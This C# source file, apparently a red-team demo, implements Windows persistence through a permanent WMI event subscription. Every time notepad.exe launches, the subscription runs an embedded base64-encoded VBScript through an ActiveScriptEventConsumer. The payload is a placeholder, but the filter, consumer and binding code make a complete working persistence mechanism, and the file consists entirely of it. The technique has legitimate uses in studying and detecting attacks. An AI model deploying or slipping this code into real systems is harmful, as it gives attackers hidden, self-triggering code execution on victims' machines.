// WMI Event Subscription Peristence Demo
// Author: @domchell

using System;
using System.Text;
using System.Management;

namespace WMIPersistence
{
    class Program
    {
        static void Main(string[] args)
        {
            PersistWMI();
        }

        static void PersistWMI()
        {
            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;

            string vbscript64 = "<INSIDE base64 encoded VBS here>";
            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");

                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +            
        "WHERE TargetInstance ISA \"Win32_Process\" " +           
        "AND TargetInstance.Name = \"notepad.exe\"";

                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "demoEventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");

                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "BadActiveScriptEventConsumer";
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbscript;
                myEventConsumer.Put();

                Console.WriteLine("[*] Event consumer created.");

                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } // END CATCH
            Console.ReadKey();
        } // END FUNC
    } // END CLASS
} // END NAMESPACE
